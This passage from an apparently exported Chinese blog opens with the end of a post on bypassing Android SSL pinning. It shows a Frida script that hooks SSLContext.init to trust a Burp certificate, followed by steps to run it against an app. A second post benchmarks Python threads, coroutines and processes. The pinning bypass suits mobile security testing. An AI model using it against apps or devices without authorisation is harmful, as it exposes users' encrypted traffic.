class="string">&quot;[.] Cert Pinning Bypass/Re-Pinning&quot;</span>);</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">var</span> <span class="title class_">CertificateFactory</span> = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;java.security.cert.CertificateFactory&quot;</span>);</span><br><span class="line">        <span class="keyword">var</span> <span class="title class_">FileInputStream</span> = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;java.io.FileInputStream&quot;</span>);</span><br><span class="line">        <span class="keyword">var</span> <span class="title class_">BufferedInputStream</span> = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;java.io.BufferedInputStream&quot;</span>);</span><br><span class="line">        <span class="keyword">var</span> X509Certificate = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;java.security.cert.X509Certificate&quot;</span>);</span><br><span class="line">        <span class="keyword">var</span> <span class="title class_">KeyStore</span> = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;java.security.KeyStore&quot;</span>);</span><br><span class="line">        <span class="keyword">var</span> <span class="title class_">TrustManagerFactory</span> = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;javax.net.ssl.TrustManagerFactory&quot;</span>);</span><br><span class="line">        <span class="keyword">var</span> <span class="title class_">SSLContext</span> = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;javax.net.ssl.SSLContext&quot;</span>);</span><br><span class="line"> </span><br><span class="line">        <span class="comment">// Load CAs from an InputStream</span></span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;[+] Loading our CA...&quot;</span>)</span><br><span class="line">        cf = <span class="title class_">CertificateFactory</span>.<span class="title function_">getInstance</span>(<span class="string">&quot;X.509&quot;</span>);</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">var</span> fileInputStream = <span class="title class_">FileInputStream</span>.$new(<span class="string">&quot;/data/local/tmp/1111.crt&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span>(err) &#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;[o] &quot;</span> + err);</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">var</span> bufferedInputStream = <span class="title class_">BufferedInputStream</span>.$new(fileInputStream);</span><br><span class="line">          <span class="keyword">var</span> ca = cf.<span class="title function_">generateCertificate</span>(bufferedInputStream);</span><br><span class="line">        bufferedInputStream.<span class="title function_">close</span>();</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">var</span> certInfo = <span class="title class_">Java</span>.<span class="title function_">cast</span>(ca, X509Certificate);</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;[o] Our CA Info: &quot;</span> + certInfo.<span class="title function_">getSubjectDN</span>());</span><br><span class="line"> </span><br><span class="line">        <span class="comment">// Create a KeyStore containing our trusted CAs</span></span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;[+] Creating a KeyStore for our CA...&quot;</span>);</span><br><span class="line">        <span class="keyword">var</span> keyStoreType = <span class="title class_">KeyStore</span>.<span class="title function_">getDefaultType</span>();</span><br><span class="line">        <span class="keyword">var</span> keyStore = <span class="title class_">KeyStore</span>.<span class="title function_">getInstance</span>(keyStoreType);</span><br><span class="line">        keyStore.<span class="title function_">load</span>(<span class="literal">null</span>, <span class="literal">null</span>);</span><br><span class="line">        keyStore.<span class="title function_">setCertificateEntry</span>(<span class="string">&quot;ca&quot;</span>, ca);</span><br><span class="line"> </span><br><span class="line">        <span class="comment">// Create a TrustManager that trusts the CAs in our KeyStore</span></span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;[+] Creating a TrustManager that trusts the CA in our KeyStore...&quot;</span>);</span><br><span class="line">        <span class="keyword">var</span> tmfAlgorithm = <span class="title class_">TrustManagerFactory</span>.<span class="title function_">getDefaultAlgorithm</span>();</span><br><span class="line">        <span class="keyword">var</span> tmf = <span class="title class_">TrustManagerFactory</span>.<span class="title function_">getInstance</span>(tmfAlgorithm);</span><br><span class="line">        tmf.<span class="title function_">init</span>(keyStore);</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;[+] Our TrustManager is ready...&quot;</span>);</span><br><span class="line"> </span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;[+] Hijacking SSLContext methods now...&quot;</span>)</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;[-] Waiting for the app to invoke SSLContext.init()...&quot;</span>)</span><br><span class="line"> </span><br><span class="line">           <span class="title class_">SSLContext</span>.<span class="property">init</span>.<span class="title function_">overload</span>(<span class="string">&quot;[Ljavax.net.ssl.KeyManager;&quot;</span>, <span class="string">&quot;[Ljavax.net.ssl.TrustManager;&quot;</span>, <span class="string">&quot;java.security.SecureRandom&quot;</span>).<span class="property">implementation</span> = <span class="keyword">function</span>(<span class="params">a,b,c</span>) &#123;</span><br><span class="line">               <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;[o] App invoked javax.net.ssl.SSLContext.init...&quot;</span>);</span><br><span class="line">               <span class="title class_">SSLContext</span>.<span class="property">init</span>.<span class="title function_">overload</span>(<span class="string">&quot;[Ljavax.net.ssl.KeyManager;&quot;</span>, <span class="string">&quot;[Ljavax.net.ssl.TrustManager;&quot;</span>, <span class="string">&quot;java.security.SecureRandom&quot;</span>).<span class="title function_">call</span>(<span class="variable language_">this</span>, a, tmf.<span class="title function_">getTrustManagers</span>(), c);</span><br><span class="line">               <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;[+] SSLContext initialized with our custom TrustManager!&quot;</span>);</span><br><span class="line">           &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;,<span class="number">0</span>);</span><br></pre></td></tr></table></figure>

<p>使用步骤：</p>
<p>1、导出burp证书放入手机的&#x2F;data&#x2F;local&#x2F;tmp内，证书格式为crt(可直接burp证书修改后缀名)，最好也在手机上安装下这个证书方便以后抓包的操作</p>
<p>2、adb shell 进入手机命令行 开启 frida server</p>
<p>3、修改frida-android-repining_sa1.js代码中28行的证书路径</p>
<p>4、frida -U -f 包名 -l .\frida-android-repining_sa1.js –no-pause</p>
<h3 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h3><p style="text-indent: 2em;">上述这些都是我绕过SSL-Pinning的一些经验,如果有错误的地方还希望大家可知指出来,帮助我更好的学习andriod安全.然后想说最近访问点涨的有点猛,不知道是真的有人在看吗?还是有人扫描?我很慌!!!



]]></content>
      <categories>
        <category>android</category>
      </categories>
      <tags>
        <tag>app</tag>
        <tag>ssl-unpining</tag>
      </tags>
  </entry>
  <entry>
    <title>python开发中的速度追求</title>
    <url>//posts/python%E5%BC%80%E5%8F%91%E4%B8%AD%E7%9A%84%E9%80%9F%E5%BA%A6%E8%BF%BD%E6%B1%82/</url>
    <content><![CDATA[<h1 id="python中执行速度的技术选择"><a href="#python中执行速度的技术选择" class="headerlink" title="python中执行速度的技术选择"></a>python中执行速度的技术选择</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>最近在开发一个扫描的项目，很多时候，发现一个函数的执行比较频繁且缓慢，我不知道应该用多线程、协程、还是多进程 或是消息队列等。</p>
<p>这说明目前开发水平太差，还是有很多需要学习的地方。所以就想着学习一些各个技术，然后简单的做个笔记啊，并总结出什么时候用哪种技术，可以让整个扫描更快。当然目前还是自嗨开发小项目阶段，没做过大项目工程，有见解不对的地方还望看到的人指正。</p>
<p>后面主要介绍多线程、协程、消息队列和异步。</p>
<h2 id="多线程"><a href="#多线程" class="headerlink" title="多线程"></a>多线程</h2><p>python一提起多线程，我们搜到的资料基本就会说是鸡肋，是没用的，应该使用协程。以前我也没有好好的深究过这个问题，现在我们来看下python的多线程到底有没有用？</p>
<p>首先网上的资料都会说到GIL的问题导致python多线程很鸡肋，那什么是GIL锁？</p>
<p><strong>GIL锁</strong></p>
<p>GIL的存在主要是为了防止Python解释器中的数据结构被多个线程同时修改，导致数据结构出现不一致的情况。通过限制同一时刻只有一个线程能够执行Python字节码，GIL可以确保Python解释器中的数据结构不会被多个线程同时修改，从而保证线程安全。</p>
<p><strong>测试</strong></p>
<p>我们写一个多线程和普通执行的测试，都执行5000次计算，一个单线程执行，一个多线程执行：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 打印随机数的函数</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">print_random</span>():</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">500</span>):</span><br><span class="line">        result = <span class="number">9999999919</span>+<span class="number">5678987656</span></span><br><span class="line">        <span class="comment"># response = requests.get(&quot;https://www.baidu.com&quot;)</span></span><br><span class="line">        <span class="comment"># print(response)</span></span><br><span class="line">        </span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建线程并启动</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create_threads</span>():</span><br><span class="line">    start_time = time.time()</span><br><span class="line">    threads = []</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">ppdom</span>():</span><br><span class="line">        result = <span class="number">9999999919</span>+<span class="number">5678987656</span></span><br><span class="line">        <span class="comment"># response = requests.get(&quot;https://www.baidu.com&quot;)</span></span><br><span class="line">        <span class="comment"># print(response)</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">500</span>):  <span class="comment"># 创建500个线程</span></span><br><span class="line">        thread = threading.Thread(target=ppdom)</span><br><span class="line">        thread.start()</span><br><span class="line">    <span class="keyword">for</span> thread <span class="keyword">in</span> threads:</span><br><span class="line">        thread.join()</span><br><span class="line">    end_time = time.time()</span><br><span class="line">    execution_time = end_time - start_time</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;多线程执行耗时：&quot;</span>, execution_time)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create_singal</span>():</span><br><span class="line">    start_time_signal = time.time()</span><br><span class="line">    print_random()</span><br><span class="line">    end_time_signal = time.time()</span><br><span class="line">    <span class="built_in">print</span>(start_time_signal)</span><br><span class="line">    <span class="built_in">print</span>(end_time_signal)</span><br><span class="line">    execution_time1 = end_time_signal - start_time_signal</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;单线程执行耗时：&quot;</span>, execution_time1)</span><br><span class="line"><span class="comment"># 调用函数</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    create_singal()</span><br><span class="line">    create_threads()</span><br></pre></td></tr></table></figure>

<p>执行多次发现，多线程比单线程的耗时更长(注意这里单线程是e-05次方)：</p>
<p>![image-20230904140830892](&#x2F;Users&#x2F;geez&#x2F;Library&#x2F;Application Support&#x2F;typora-user-images&#x2F;image-20230904140830892.png)</p>
<p>这真的很离谱，多线程好像还不如单线程呢，完全没必要用到多线程。难道真的就是网上说的啥时候都别用多线程就对了吗？</p>
<p>那再看看下面这个代码：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">## 多线程和单线程的比较</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 打印随机数的函数</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">print_random</span>():</span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">        <span class="comment"># result = 99+100</span></span><br><span class="line">        response = requests.get(<span class="string">&quot;https://www.baidu.com&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(response)</span><br><span class="line">        </span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建线程并启动</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create_threads</span>():</span><br><span class="line">    start_time = time.time()</span><br><span class="line">    threads = []</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">ppdom</span>():</span><br><span class="line">        <span class="comment"># result = 99+100</span></span><br><span class="line">        response = requests.get(<span class="string">&quot;https://www.baidu.com&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(response)</span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):  <span class="comment"># 创建5个线程</span></span><br><span class="line">        thread = threading.Thread(target=ppdom)</span><br><span class="line">        thread.start()</span><br><span class="line">    end_time = time.time()</span><br><span class="line">    execution_time = end_time - start_time</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;多线程执行耗时：&quot;</span>, execution_time)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create_singal</span>():</span><br><span class="line">    start_time = time.time()</span><br><span class="line">    print_random()</span><br><span class="line">    end_time = time.time()</span><br><span class="line">    execution_time = end_time - start_time</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;单线程执行耗时：&quot;</span>, execution_time)</span><br><span class="line"><span class="comment"># 调用函数</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    create_threads()</span><br><span class="line">    create_singal()</span><br></pre></td></tr></table></figure>

<p>这里我们仅修改函数从原来的简单计算改为网络请求，运行结果如下：</p>
<p>![image-20230901172004526](&#x2F;Users&#x2F;geez&#x2F;Library&#x2F;Application Support&#x2F;typora-user-images&#x2F;image-20230901172004526.png)</p>
<p>同样执行五次请求，这时候我们可以发现多线程远远快于单线程，这是为什么呢？</p>
<p>因为耗时的IO应用（内存、网络、硬盘等等读取属于IO密集型运算）并不影响线程的执行，也就是cpu和IO是可以并行的。由于上面的代码中 request.get() 一个 I&#x2F;O 密集型操作，即主要花费时间在等待网络 I&#x2F;O 操作完成上。由于线程是独立的，一个线程在等待网络响应时，其他线程可以继续执行，从而最大程度上减少了阻塞等待的时间。所以我们也能看到速度飞快。</p>
<p><strong>结论</strong></p>
<p>由此我们可以得出结论，在GIL锁存在的情况下，如果程序是IO密集型的，那么多线程可以极大的加快速度。但如果程序不是 I&#x2F;O 密集型时，多线程可能并不能提高性能，甚至还可能因为线程间的上下文切换导致额外的开销。另外由于GIL锁的存在，即使你的CPU多核，也很难发挥作用。所以多线程的运用与否主要考虑是否是IO密集型的操作。</p>
<h2 id="协程"><a href="#协程" class="headerlink" title="协程"></a>协程</h2><p>上面说到了多线程，现在再来看看协程是怎么回事。</p>
<p><strong>概念</strong><br>Python 3 引入了协程（coroutine）的概念，通过使用关键字 async 和 await 实现。协程是一种轻量级的并发编程方式，支持在单线程中实现并发执行的效果。</p>
<p>下面是Python 3中协程的一些重要特点和概念：</p>
<ul>
<li>协程与生成器（generator）：协程使用async def定义，并通过await关键字来挂起执行和等待其他协程完成。协程本质上是一种特殊的生成器，利用生成器的yield关键字进行状态保存和恢复。</li>
<li>async 和 await关键字：async关键字用于定义协程函数，表示函数是一个可以被挂起和恢复的协程。await关键字用于挂起协程的执行，等待另一个协程完成或者等待I&#x2F;O操作完成。</li>
<li>非阻塞的等待：协程可以在等待I&#x2F;O完成时挂起执行，允许其他协程继续执行。这种非阻塞的等待方式使得协程能够充分利用CPU和I&#x2F;O资源，提高并发性能。</li>
<li>事件循环（event loop）：Python 3的协程通常会在事件循环中执行。事件循环负责调度多个协程，使它们能够交替执行和等待，以实现并发效果。</li>
<li>异步I&#x2F;O支持：协程在处理I&#x2F;O密集型任务时特别有效。常用的异步I&#x2F;O库例如asyncio提供了高级的异步编程机制，用于处理协程之间的调度和协作。</li>
</ul>
<p><strong>测试</strong><br>我们再次编写一个测试函数，分别用到了协程、多线程和单线程，分别执行50次的请求百度的运算：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> asyncio</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="comment"># 普通执行版本</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">normal_execution</span>():</span><br><span class="line">    start_time = time.time()</span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">50</span>):</span><br><span class="line">        <span class="comment"># result = 99+1000</span></span><br><span class="line">        response = requests.get(<span class="string">&quot;https://www.baidu.com&quot;</span>)</span><br><span class="line">        <span class="comment"># print(response)</span></span><br><span class="line">    end_time = time.time()</span><br><span class="line">    execution_time = end_time - start_time</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;普通执行耗时：&quot;</span>, execution_time)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 多线程执行版本</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">threaded_execution</span>():</span><br><span class="line">    start_time = time.time()</span><br><span class="line">    threads = []</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">thread_function</span>():</span><br><span class="line">        <span class="comment"># result = 99+1000</span></span><br><span class="line">        response = requests.get(<span class="string">&quot;https://www.baidu.com&quot;</span>)</span><br><span class="line">        <span class="comment"># print(response)</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">50</span>):</span><br><span class="line">        thread = threading.Thread(target=thread_function)</span><br><span class="line">        threads.append(thread)</span><br><span class="line">        thread.start()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> thread <span class="keyword">in</span> threads:</span><br><span class="line">        thread.join()</span><br><span class="line"></span><br><span class="line">    end_time = time.time()</span><br><span class="line">    execution_time = end_time - start_time</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;多线程执行耗时：&quot;</span>, execution_time)</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">fetch</span>(<span class="params">session</span>):</span><br><span class="line">    url = <span class="string">&#x27;https://www.baidu.com&#x27;</span></span><br><span class="line">    <span class="keyword">async</span> <span class="keyword">with</span> session.get(url) <span class="keyword">as</span> response:</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">await</span> response.text()</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">request_baidu</span>():</span><br><span class="line">    <span class="keyword">async</span> <span class="keyword">with</span> aiohttp.ClientSession() <span class="keyword">as</span> session:</span><br><span class="line">        tasks = []</span><br><span class="line">        <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">50</span>):</span><br><span class="line">            task = asyncio.ensure_future(fetch(session))</span><br><span class="line">            tasks.append(task)</span><br><span class="line">        responses = <span class="keyword">await</span> asyncio.gather(*tasks)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 比较函数</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">compare_execution_time</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;开始普通执行...&quot;</span>)</span><br><span class="line">    normal_execution()</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;\n开始多线程执行...&quot;</span>)</span><br><span class="line">    threaded_execution()</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;\n开始协程执行...&quot;</span>)</span><br><span class="line">    start_time = time.time()</span><br><span class="line">    loop = asyncio.get_event_loop()</span><br><span class="line">    results = loop.run_until_complete(request_baidu())</span><br><span class="line">    end_time = time.time()</span><br><span class="line">    execution_time = end_time - start_time</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;协程执行耗时：&quot;</span>, execution_time)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 调用比较函数</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    compare_execution_time()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>执行结果如下：</p>
<p>![image-20230904141410552](&#x2F;Users&#x2F;geez&#x2F;Library&#x2F;Application Support&#x2F;typora-user-images&#x2F;image-20230904141410552.png)</p>
<p>可以看到协程速度飞快，</p>
<p>我们再换成IO非密集操作仅作算数计算，同样都计算500次：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> asyncio</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="comment"># 普通执行版本</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">normal_execution</span>():</span><br><span class="line">    start_time = time.time()</span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">500</span>):</span><br><span class="line">        result = <span class="number">99999</span>+<span class="number">54673829</span></span><br><span class="line">        <span class="comment"># response = requests.get(&quot;https://www.baidu.com&quot;)</span></span><br><span class="line">        <span class="comment"># print(response)</span></span><br><span class="line">    end_time = time.time()</span><br><span class="line">    execution_time = end_time - start_time</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;普通执行耗时：&quot;</span>, execution_time)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 多线程执行版本</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">threaded_execution</span>():</span><br><span class="line">    start_time = time.time()</span><br><span class="line">    threads = []</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">thread_function</span>():</span><br><span class="line">        result = <span class="number">99999</span>+<span class="number">54673829</span></span><br><span class="line">        <span class="comment"># response = requests.get(&quot;https://www.baidu.com&quot;)</span></span><br><span class="line">        <span class="comment"># print(response)</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">500</span>):</span><br><span class="line">        thread = threading.Thread(target=thread_function)</span><br><span class="line">        threads.append(thread)</span><br><span class="line">        thread.start()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> thread <span class="keyword">in</span> threads:</span><br><span class="line">        thread.join()</span><br><span class="line"></span><br><span class="line">    end_time = time.time()</span><br><span class="line">    execution_time = end_time - start_time</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;多线程执行耗时：&quot;</span>, execution_time)</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">fetch</span>(<span class="params">session</span>):</span><br><span class="line">    result = <span class="number">99999</span>+<span class="number">54673829</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">request_baidu</span>():</span><br><span class="line">    <span class="keyword">async</span> <span class="keyword">with</span> aiohttp.ClientSession() <span class="keyword">as</span> session:</span><br><span class="line">        tasks = []</span><br><span class="line">        <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">500</span>):</span><br><span class="line">            task = asyncio.ensure_future(fetch(session))</span><br><span class="line">            tasks.append(task)</span><br><span class="line">        responses = <span class="keyword">await</span> asyncio.gather(*tasks)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 比较函数</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">compare_execution_time</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;开始普通执行...&quot;</span>)</span><br><span class="line">    normal_execution()</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;\n开始多线程执行...&quot;</span>)</span><br><span class="line">    threaded_execution()</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;\n开始协程执行...&quot;</span>)</span><br><span class="line">    start_time = time.time()</span><br><span class="line">    loop = asyncio.get_event_loop()</span><br><span class="line">    results = loop.run_until_complete(request_baidu())</span><br><span class="line">    end_time = time.time()</span><br><span class="line">    execution_time = end_time - start_time</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;协程执行耗时：&quot;</span>, execution_time)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 调用比较函数</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    compare_execution_time()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>执行结果：</p>
<p>![image-20230904141620788](&#x2F;Users&#x2F;geez&#x2F;Library&#x2F;Application Support&#x2F;typora-user-images&#x2F;image-20230904141620788.png)</p>
<p>可以看到协程速度虽然比多线程快，但还不如单线程，这就又回到了前面那样，在计算密集型计算中协程和多线程都是弟弟水平。但是协程度又确实比多线程快，那是不是以后需要用到多线程的地方直接用协程就行？</p>
<p>当然不是，如果注意观察可以看到上述代码中请求百度的库，别的代码使用的是requests，而协程使用的是aiohttp，这是因为requests不支持异步，也就没办法支持协程。另外协程的编程复杂度也高于多线程。所以很多时候在协程库不支持或是协程复杂度实现不能接受的时候，可以考虑使用多线程。</p>
<p><strong>结论：</strong></p>
<p>CPU密集型操作协程速度大于多线程但不如单线程，IO密集型操作协程远远大于多线程和单线程。</p>
<h2 id="多进程"><a href="#多进程" class="headerlink" title="多进程"></a>多进程</h2><p>上面的比较又引出一个新的问题，CPU密集型的运算中 难道就只能使用单线程吗？</p>
<p>当然不是，这里我们引入多进程的概念：</p>
<ul>
<li>Python中的多进程是指同时运行多个独立进程的能力。每个进程都有自己独立的内存空间和资源，可以并行地执行任务。这种并行和独立的特性使得多进程在处理计算密集型任务和提高CPU利用率方面非常有效。Python提供了multiprocessing模块来支持多进程编程</li>
</ul>
<p>测试CPU密集型计算:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> multiprocessing</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cpu_intensive_calculation</span>():</span><br><span class="line">    total = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">20000000</span>):</span><br><span class="line">        total += i</span><br><span class="line">    <span class="keyword">return</span> total</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">single_threaded</span>():</span><br><span class="line">    start_time = time.time()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">        cpu_intensive_calculation()</span><br><span class="line"></span><br><span class="line">    end_time = time.time()</span><br><span class="line">    elapsed_time = end_time - start_time</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;单线程执行耗时: <span class="subst">&#123;elapsed_time&#125;</span> seconds&quot;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">multi_process1</span>():</span><br><span class="line">    start_time = time.time()</span><br><span class="line"></span><br><span class="line">    num_processes = multiprocessing.cpu_count()  <span class="comment"># 获取CPU核心数量 8个</span></span><br><span class="line">    <span class="built_in">print</span>(num_processes)</span><br><span class="line">    num_tasks = <span class="number">5000</span></span><br><span class="line"></span><br><span class="line">    processes = []</span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(num_processes):</span><br><span class="line">        process = multiprocessing.Process(target=cpu_intensive_calculation)</span><br><span class="line">        processes.append(process)</span><br><span class="line">        process.start()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> process <span class="keyword">in</span> processes:</span><br><span class="line">        process.join()</span><br><span class="line">    end_time = time.time()</span><br><span class="line">    elapsed_time = end_time - start_time</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;多进程执行耗时: <span class="subst">&#123;elapsed_time&#125;</span> seconds&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    single_threaded()</span><br><span class="line">    multi_process1()</span><br></pre></td></tr></table></figure>

<p>执行结果如下</p>
<p>![image-20230904143720227](&#x2F;Users&#x2F;geez&#x2F;Library&#x2F;Application Support&#x2F;typora-user-images&#x2F;image-20230904143720227.png)</p>
<p>可以看到 多进程在CPU密集型计算中会更有优势一点。</p>
<h2 id="消息队列"><a href="#消息队列" class="headerlink" title="消息队列"></a>消息队列</h2><p>其实协程中就有异步的概念，消息队列也有点异步的意思，严格来说消息队列和线程、进程不是一类技术，它是为了解决另一个问题：解耦、异步、削峰。</p>
<p>解耦：比如打卡系统和考勤系统是关联的，那么如果中间加入消息队列，打卡系统就只需要把打卡的数据放入消息队列由考勤系统去取就行。不必关心这两者系统的关联。</p>
<p>异步：多人打卡时可能每个打卡到都需要记录到考勤系统，但不可能每个人都是打完卡记录完以后才能下一个人打开，消息队列可以异步处理。简单说就是 打卡时打卡，考勤记录是考勤记录，中间由消息队列提供缓存和消息传递。</p>
<p>削峰：并发访问高峰期，可以缓存到中间件中减少对其他任务的压力。比如发送邮件是耗时应用，每天定期发送的邮件可能有几封，但是一家公司可能有上千人，这时候发送邮件就可以进入消息队列，然后再慢慢发送，防止流量过载。</p>
<p><strong>消息队列的使用demo：</strong></p>
<p>1、安装celery和redis</p>
